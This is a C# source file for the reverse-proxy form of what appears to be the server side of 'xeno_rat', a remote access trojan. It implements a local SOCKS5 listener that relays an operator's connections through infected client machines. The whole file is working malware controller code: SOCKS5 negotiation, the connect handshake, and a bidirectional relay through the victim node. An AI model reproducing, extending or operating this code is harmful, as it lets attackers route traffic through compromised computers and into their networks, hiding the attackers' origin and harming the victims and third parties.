using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace xeno_rat_server.Forms
{
    public partial class Reverse_Proxy : Form
    {
        Node client;
        public Reverse_Proxy(Node _client)
        {
            InitializeComponent();
            client = _client;
            client.AddTempOnDisconnect(TempOnDisconnect);
        }
        private const int TIMEOUT_SOCKET = 10;
        private const string LOCAL_ADDR = "127.0.0.1";
        private List<Node> killnodes = new List<Node>();
        private Socket new_socket = null;

        /// <summary>
        /// Handles the disconnection of a node.
        /// </summary>
        /// <param name="node">The node that has been disconnected.</param>
        /// <remarks>
        /// If the disconnected node is the client, it closes the new socket if it exists and disposes it.
        /// If the current object is not disposed, it invokes the close method using the UI thread.
        /// </remarks>
        public void TempOnDisconnect(Node node)
        {
            if (node == client)
            {
                if (new_socket != null)
                {
                    new_socket.Close(0);
                    new_socket = null;
                }
                if (!this.IsDisposed)
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }

        /// <summary>
        /// Creates a new socket with the specified address family, socket type, and protocol type, and sets the receive timeout option.
        /// </summary>
        /// <returns>A new <see cref="Socket"/> instance with the specified configuration.</returns>
        /// <exception cref="SocketException">Thrown when the creation of the socket fails.</exception>
        private static Socket CreateSocket()
        {
            try
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, TIMEOUT_SOCKET);
                return sock;
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Failed to create socket: {0}", ex.Message);
                return null;
            }
        }

        /// <summary>
        /// Binds the specified socket to the given local port and address.
        /// </summary>
        /// <param name="sock">The socket to bind.</param>
        /// <param name="LOCAL_PORT">The local port to bind to.</param>
        /// <returns>True if the binding is successful; otherwise, false.</returns>
        /// <remarks>
        /// This method attempts to bind the provided socket to the specified local port and address.
        /// It sets the socket option to reuse the address and then binds the socket to the provided local endpoint.
        /// If a SocketException occurs during the binding process, the method catches the exception, logs the error message, closes the socket, and returns false.
        /// If an exception occurs while attempting to listen on the socket, the method catches the exception, closes the socket, and returns false.
        /// </remarks>
        private static bool BindPort(Socket sock, int LOCAL_PORT)
        {
            try
            {
                Console.WriteLine("Bind {0}", LOCAL_PORT);
                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                sock.Bind(new IPEndPoint(IPAddress.Parse(LOCAL_ADDR), LOCAL_PORT));
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Bind failed: {0}", ex.Message);
                sock.Close(0);
                return false;
            }

            try
            {
                sock.Listen(1);
            }
            catch
            {
                sock.Close(0);
                return false;
            }

            return true;
        }

        /// <summary>
        /// Creates a sub-sub node for the given client node and returns the created node.
        /// </summary>
        /// <param name="client">The client node for which the sub-sub node is to be created.</param>
        /// <returns>The created sub-sub node if successful; otherwise, null.</returns>
        /// <exception cref="System.NullReferenceException">Thrown when the parent node of the client is null.</exception>
        /// <exception cref="System.InvalidOperationException">Thrown when the type 2 ID cannot be set for the sub-sub node.</exception>
        /// <remarks>
        /// This method creates a sub-sub node for the given client node by calling the CreateSubNodeAsync method on the parent node of the client.
        /// It then sets the type 2 ID for the sub-sub node using the Utils.SetType2setIdAsync method and sends the type 2 return using the Utils.Type2returnAsync method.
        /// If successful, it sends the ID to the client and waits for a response. If the response indicates success, the sub-sub node is returned; otherwise, it is disconnected and null is returned.
        /// </remarks>
        private async Task<Node> CreateSubSubNode(Node client)
        {
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            if (SubSubNode == null) 
            {
                return null;
            }
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }

        /// <summary>
        /// Receives all the data from the socket of the specified size and returns it as a byte array.
        /// </summary>
        /// <param name="sock">The socket from which to receive the data.</param>
        /// <param name="size">The size of the data to be received.</param>
        /// <returns>The received data as a byte array.</returns>
        /// <exception cref="ArgumentNullException">Thrown when the <paramref name="sock"/> is null.</exception>
        /// <exception cref="ObjectDisposedException">Thrown when the <paramref name="sock"/> has been closed.</exception>
        private async Task<byte[]> RecvAll(Socket sock, int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }

                int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                if (recv == 0)
                {
                    data = null;
                    break;
                }

                total += recv;
                dataLeft -= recv;
            }

            return data;
        }

        /// <summary>
        /// Sends a reply method selection to the specified socket and returns a boolean indicating the success of the operation.
        /// </summary>
        /// <param name="sock">The socket to which the reply method selection will be sent.</param>
        /// <param name="method_code">The method code to be included in the reply.</param>
        /// <returns>True if the reply method selection was successfully sent; otherwise, false.</returns>
        /// <remarks>
        /// This method constructs a reply message containing the specified method code and sends it to the provided socket.
        /// If the socket is not connected, the method returns false.
        /// The method uses asynchronous I/O to send the reply message and awaits the completion of the operation.
        /// </remarks>
        private async Task<bool> replyMethodSelection(Socket sock, byte method_code) 
        {
            byte[] reply = new byte[] { 5, method_code };
            if (!sock.Connected) 
            {
                return false;
            }
            return (await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None))!=0;
        }

        /// <summary>
        /// Replies with an error to the request on the specified socket.
        /// </summary>
        /// <param name="sock">The socket to reply to.</param>
        /// <param name="rep_err_code">The error code to be included in the reply.</param>
        /// <returns>
        /// A <see cref="Task{TResult}"/> representing the asynchronous operation. The task result is <see langword="true"/> if the reply was sent successfully; otherwise, <see langword="false"/>.
        /// </returns>
        /// <remarks>
        /// This method constructs a reply with the specified error code and sends it over the provided socket.
        /// If the socket is not connected, the method returns <see langword="false"/>.
        /// </remarks>
        private async Task<bool> replyRequestError(Socket sock, byte rep_err_code)
        {
            byte[] reply = new byte[] { 5, rep_err_code, 0x00, Socks5Const.AddressType.IPv4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            if (!sock.Connected)
            {
                return false;
            }
            return (await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None)) != 0;
        }

        /// <summary>
        /// Starts the negotiation process with the client socket for SOCKS5 protocol.
        /// </summary>
        /// <param name="client_sock">The client socket to start negotiations with.</param>
        /// <returns>True if negotiation is successful, otherwise false.</returns>
        /// <remarks>
        /// This method initiates the negotiation process with the client socket for the SOCKS5 protocol. It first checks the version header received from the client and if it is not 5, it replies with a method selection indicating no acceptable methods and returns false.
        /// If the version header is 5, it proceeds to receive the number of methods to use, ranging from 0 to 256. If the number of methods is not received, it returns false.
        /// It then iterates through the requested methods and adds them to a list. If the list does not contain the method for no authentication required, it replies with a method selection indicating no acceptable methods and returns false.
        /// If the method for no authentication required is present, it replies with a method selection indicating no authentication required and returns true.
        /// </remarks>
        private async Task<bool> StartNegotiations(Socket client_sock)
        {
            byte[] version_header = await RecvAll(client_sock, 1);
            if (version_header == null || version_header[0] != 5) // checking if socks(5)
            {
                await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAcceptableMethods);
                return false;
            }
            byte[] number_of_methods = await RecvAll(client_sock, 1); // requested methods to use, ranging for 0-256
            if (number_of_methods == null) 
            {
                return false;
            }
            List<int> requested_methods = new List<int>();
            for (int i = 0; i < number_of_methods[0]; i++)
            {
                byte[] method = await RecvAll(client_sock, 1);
                requested_methods.Add(method[0]);
            }
            if (!requested_methods.Contains(Socks5Const.AuthMethod.NoAuthenticationRequired)) 
            {
                await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAcceptableMethods);
                return false;
            }
            await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAuthenticationRequired);
            return true;
        }

        /// <summary>
        /// Asynchronously disconnects the specified socket.
        /// </summary>
        /// <param name="sock">The socket to be disconnected.</param>
        /// <remarks>
        /// This method asynchronously disconnects the specified <paramref name="sock"/>.
        /// It first checks if the <paramref name="sock"/> is not null, then waits for 10 milliseconds using <see cref="Task.Delay(int)"/> before initiating the disconnect operation using <see cref="Task.Factory.FromAsync(System.AsyncCallback, System.AsyncCallback, System.Net.Sockets.Socket, object)"/>.
        /// If an exception occurs during the disconnect operation, the method attempts to close the <paramref name="sock"/> using <see cref="Socket.Close(int)"/>.
        /// </remarks>
        /// <exception cref="ObjectDisposedException">Thrown if the <paramref name="sock"/> has already been disposed.</exception>
        /// <exception cref="SocketException">Thrown if an error occurs when attempting to disconnect the <paramref name="sock"/>.</exception>
        private async Task DisconnectSockAsync(Socket sock)
        {
            try
            {
                if (sock != null)
                {
                    await Task.Delay(10);
                    await Task.Factory.FromAsync(sock.BeginDisconnect, sock.EndDisconnect, true, null);
                }
            }
            catch
            {
                sock?.Close(0);
            }
        }

        /// <summary>
        /// Handles the connection and proxy for the given client socket.
        /// </summary>
        /// <param name="client_sock">The client socket to handle the connection and proxy for.</param>
        /// <remarks>
        /// This method handles the SOCKS5 protocol for proxying connections. It first receives the version header from the client socket and checks if it is SOCKS5.
        /// If not, it replies with a method selection message and disconnects the socket.
        /// If it is SOCKS5, it proceeds to receive the command, reserved byte, and address type bytes.
        /// It then validates the command and address type, and based on the address type, receives the destination address and port.
        /// It then creates a subnode for proxying the connection, sends the destination address and port to the subnode, and receives a response message.
        /// Based on the response message, it either replies with an error or sends the connected payload to the client socket.
        /// If the payload is sent properly, it adds the destination address and port to a list view, initiates a receive-send loop, and finally disconnects the client socket and subnode.
        /// </remarks>
        /// <exception cref="Exception">Thrown when there is an error in handling the connection and proxy.</exception>
        private async Task HandleConnectAndProxy(Socket client_sock)
        {
            // on all returns decomission the sockets
            byte[] version_header = await RecvAll(client_sock, 1);
            if (version_header == null || version_header[0] != 5) // checking if socks(5)
            {
                await replyMethodSelection(client_sock, Socks5Const.AuthMethod.NoAcceptableMethods);
                await DisconnectSockAsync(client_sock);
                return;
            }


            byte[] command = await RecvAll(client_sock, 1); // requested methods to use, ranging for 0-256
            byte[] rzv = await RecvAll(client_sock, 1);
            byte[] Address_type_bytes = await RecvAll(client_sock, 1);

            if (Address_type_bytes == null || command == null || command[0] != Socks5Const.Command.Connect)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.CommandNotSupported);
                await DisconnectSockAsync(client_sock);
                return;
            }
            int Address_type = Address_type_bytes[0];

            string dest_addr = "";
            if (Address_type == Socks5Const.AddressType.IPv4)
            {
                byte[] dest_addr_bytes = await RecvAll(client_sock, 4);
                if (dest_addr_bytes == null)
                {
                    await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                    await DisconnectSockAsync(client_sock);
                    return;
                }
                dest_addr = new IPAddress(dest_addr_bytes).ToString();
            }
            else if (Address_type == Socks5Const.AddressType.DomainName)
            {
                byte[] domain_name_len = await RecvAll(client_sock, 1);
                if (domain_name_len == null)
                {
                    await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                    await DisconnectSockAsync(client_sock);
                    return;
                }
                byte[] domain_name_bytes = await RecvAll(client_sock, domain_name_len[0]);
                dest_addr = Encoding.UTF8.GetString(domain_name_bytes);
            }
            else
            {
                await replyRequestError(client_sock, Socks5Const.Reply.AddressTypeNotSupported);
                await DisconnectSockAsync(client_sock);
                return;
            }
            byte[] dest_port_bytes = await RecvAll(client_sock, 2);
            if (dest_port_bytes == null)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }

            if (BitConverter.IsLittleEndian)
            {
                Array.Reverse(dest_port_bytes);
            }

            int dest_port = BitConverter.ToInt16(dest_port_bytes, 0);
            int ConnectTimeout = 10000;//mili-seconds

            Node subnode = await CreateSubSubNode(client);
            if (subnode == null)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }
            killnodes.Add(subnode);
            await subnode.SendAsync(Encoding.UTF8.GetBytes(dest_addr));
            await subnode.SendAsync(subnode.sock.IntToBytes(dest_port));
            await subnode.SendAsync(subnode.sock.IntToBytes(ConnectTimeout));
            byte[] recv_msg_bytes = await subnode.ReceiveAsync();
            if (recv_msg_bytes == null) 
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }
            int recv_msg = recv_msg_bytes[0];

            if (recv_msg == 2)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.ConnectionRefused);
                await DisconnectSockAsync(client_sock);
                return;
            }
            else if (recv_msg == 3)
            {
                await replyRequestError(client_sock, Socks5Const.Reply.HostUnreachable);
                await DisconnectSockAsync(client_sock);
                return;
            }
            else if (recv_msg == 4) 
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }
            byte[] rsock_addr = await subnode.ReceiveAsync();
            byte[] rsock_port = await subnode.ReceiveAsync();
            if (rsock_addr.Length != 4 || rsock_port.Length != 2) 
            {
                await replyRequestError(client_sock, Socks5Const.Reply.Failure);
                await DisconnectSockAsync(client_sock);
                return;
            }
            byte[] ConnectedPayload = new byte[] { 5, Socks5Const.Reply.OK, 0x00, Socks5Const.AddressType.IPv4, rsock_addr[0], rsock_addr[1], rsock_addr[2], rsock_addr[3], rsock_port[0], rsock_port[1] };

            bool SentProperly = (await client_sock.SendAsync(new ArraySegment<byte>(ConnectedPayload), SocketFlags.None)) != 0;

            if (!SentProperly) 
            {
                return;
            }
            ListViewItem lvi = new ListViewItem();
            lvi.Text = dest_addr + ":" + dest_port.ToString();
            ListViewItem item=null;
            listView1.BeginInvoke((MethodInvoker)(() => { item = listView1.Items.Add(lvi); }));
            await RecvSendLoop(client_sock, subnode, 4096);
            await DisconnectSockAsync(client_sock);
            subnode.Disconnect();
            listView1.BeginInvoke((MethodInvoker)(() => { item.Remove(); }));
        }

        /// <summary>
        /// Asynchronously receives and sends data between the client socket and the subnode using the specified buffer size.
        /// </summary>
        /// <param name="client_sock">The client socket for receiving data.</param>
        /// <param name="subnode">The subnode for sending data.</param>
        /// <param name="bufferSize">The size of the buffer to be used for receiving and sending data.</param>
        /// <exception cref="SocketException">Thrown when an error occurs with the sockets.</exception>
        /// <returns>An asynchronous task representing the receive and send operation.</returns>
        /// <remarks>
        /// This method continuously checks for available data on the client socket and the subnode socket using the Poll method with a timeout of 1000 milliseconds.
        /// If data is available on the client socket, it is received into a buffer and then sent to the subnode.
        /// If data is available on the subnode, it is received and then sent to the client socket.
        /// The method also includes a delay of 100 milliseconds between iterations.
        /// </remarks>
        private async Task RecvSendLoop(Socket client_sock, Node subnode, int bufferSize)
        {
            while (button2.Enabled && client_sock.Connected && subnode.Connected() && new_socket != null)
            {
                try
                {
                    await Task.WhenAny(
                           Task.Run(() => client_sock.Poll(1000, SelectMode.SelectRead)),
                           Task.Run(() => subnode.sock.sock.Poll(1000, SelectMode.SelectRead))
                       );
                    if (client_sock.Available > 0)
                    {
                        byte[] buffer = new byte[bufferSize];
                        int bytesRead = await client_sock.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None);
                        if (bytesRead == 0)
                        {
                            return;
                        }

                        await subnode.SendAsync(buffer.Take(bytesRead).ToArray());

                    }

                    if (subnode.sock.sock.Available > 0)
                    {
                        byte[] data = await subnode.ReceiveAsync();
                        if ((await client_sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) == 0)
                        {
                            return;
                        }
                    }
                    await Task.Delay(100);
                }
                catch 
                {
                    return;
                }
            }

        }

        /// <summary>
        /// Handles the creation of a proxy for the given client socket by initiating negotiations, establishing connection and proxying data.
        /// </summary>
        /// <param name="client_sock">The client socket to handle proxy creation for.</param>
        /// <returns>An asynchronous task representing the handling of proxy creation for the client socket.</returns>
        /// <remarks>
        /// This method asynchronously starts negotiations with the client socket. If negotiations are successful, it proceeds to handle the connection and proxy data for the client socket.
        /// If negotiations fail, it disconnects the client socket asynchronously.
        /// </remarks>
        private async Task HandleProxyCreation(Socket client_sock) 
        {
            if (await StartNegotiations(client_sock))
            {
                await HandleConnectAndProxy(client_sock);
            }
            else
            {
                await DisconnectSockAsync(client_sock);
            }
        }

        /// <summary>
        /// Asynchronously accepts incoming connections and handles proxy creation.
        /// </summary>
        /// <param name="new_socket">The socket used for accepting incoming connections.</param>
        /// <remarks>
        /// This method continuously accepts incoming connections using the specified <paramref name="new_socket"/> and handles the creation of a proxy for each connection.
        /// If an exception occurs during the acceptance of a connection, the method continues to accept new connections.
        /// Once the <see cref="button2"/> is disabled, the method stops accepting new connections and awaits the asynchronous disconnection of the <paramref name="new_socket"/>.
        /// </remarks>
        private async Task AcceptLoop(Socket new_socket)
        {
            while (button2.Enabled)
            {
                try
                {
                    Socket socks_client = await new_socket.AcceptAsync();
                    HandleProxyCreation(socks_client);
                }
                catch
                {
                    continue;
                }
            }
            await DisconnectSockAsync(new_socket);
        }

        /// <summary>
        /// Handles the button click event to create and bind a socket to the specified port, and start an accept loop on a new thread.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method attempts to parse the port number from the input text box. If the parsing fails, it displays an error message and returns.
        /// It then creates a new socket and attempts to bind it to the specified port. If the binding fails, it displays an error message and returns.
        /// If the binding is successful, it disables the current button and enables another button, and starts an accept loop on a new thread.
        /// </remarks>
        /// <exception cref="System.FormatException">Thrown if the input port number is not in a valid format.</exception>
        /// <exception cref="System.Net.Sockets.SocketException">Thrown if the socket could not be bound to the specified port.</exception>
        private void button1_Click(object sender, EventArgs e)
        {   
            int port;
            if (!int.TryParse(textBox1.Text, out port)) 
            {
                MessageBox.Show("Invalid port");
                return;
            }
            new_socket = CreateSocket();
            if (!BindPort(new_socket, port)) 
            {
                MessageBox.Show("Could not bind port. Another process may already be using that port.");
                return;
            }
            button1.Enabled = false;
            button2.Enabled = true;
            new Thread(async ()=>await AcceptLoop(new_socket)).Start();
        }

        /// <summary>
        /// Clears the killnodes list, disconnects each node, closes the new_socket if not null, and enables button1 while disabling button2.
        /// </summary>
        /// <remarks>
        /// This method iterates through the killnodes list and calls the Disconnect method on each node. It then clears the killnodes list.
        /// If the new_socket is not null, it is closed with a linger state of 0 and set to null.
        /// Finally, it enables button1 and disables button2.
        /// </remarks>
        private void button2_Click(object sender, EventArgs e)
        {
            foreach (Node i in killnodes)
            {
                if (i!=null)
                i.Disconnect();
            }
            killnodes.Clear();
            if (new_socket != null)
            {
                new_socket.Close(0);
                new_socket = null;
            }
            button1.Enabled = true;
            button2.Enabled = false;

        }

        /// <summary>
        /// Handles the form closing event and disconnects all nodes in the killnodes list, clears the killnodes list, and closes the new_socket if it is not null.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A FormClosingEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method iterates through the killnodes list and disconnects each node if it is not null.
        /// Then it clears the killnodes list.
        /// If the new_socket is not null, it is closed and set to null.
        /// </remarks>
        private void Reverse_Proxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (Node i in killnodes)
            {
                if (i != null)
                    i.Disconnect();
            }
            killnodes.Clear();
            if (new_socket != null)
            {
                new_socket.Close(0);
                new_socket = null;
            }
        }

        /// <summary>
        /// Event handler for the TextChanged event of textBox2.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method is called when the text in textBox2 changes. It can be used to perform actions based on the changed text.
        /// </remarks>
        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Sets the DoubleBuffered property of the listView1 control to true, which reduces flickering during redrawing.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The EventArgs containing the event data.</param>
        private void Reverse_Proxy_Load(object sender, EventArgs e)
        {
            listView1.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView1, true, null);
        }
    }


    public static class Socks5Const
    {
        public static class AuthMethod
        {
            public static byte NoAuthenticationRequired = 0x00;
            public static byte GSSAPI = 0x01;
            public static byte UsernamePassword = 0x02;
            public static byte NoAcceptableMethods = 0xFF;
            // '\x03' to '\x7F' IANA ASSIGNED
            // '\x80' to '\xFE' RESERVED FOR PRIVATE METHODS
        }

        public static class Command
        {
            public static byte Connect = 0x01;
            public static byte Bind = 0x02;
            public static byte UdpAssociate = 0x03;
        }

        public static class AddressType
        {
            public static byte IPv4 = 0x01;
            public static byte DomainName = 0x03;
            public static byte IPv6 = 0x04;
        }

        public static class Reply
        {
           public static byte OK = 0x00;                       // succeeded
           public static byte Failure = 0x01;                  // general SOCKS server failure
           public static byte NotAllowed = 0x02;               // connection not allowed by ruleset
           public static byte NetworkUnreachable = 0x03;       // Network unreachable
           public static byte HostUnreachable = 0x04;          // Host unreachable
           public static byte ConnectionRefused = 0x05;        // Connection refused
           public static byte TtlExpired = 0x06;               // TTL expired
           public static byte CommandNotSupported = 0x07;      // Command not supported
           public static byte AddressTypeNotSupported = 0x08;   // Address type not supported
        }
    }

}
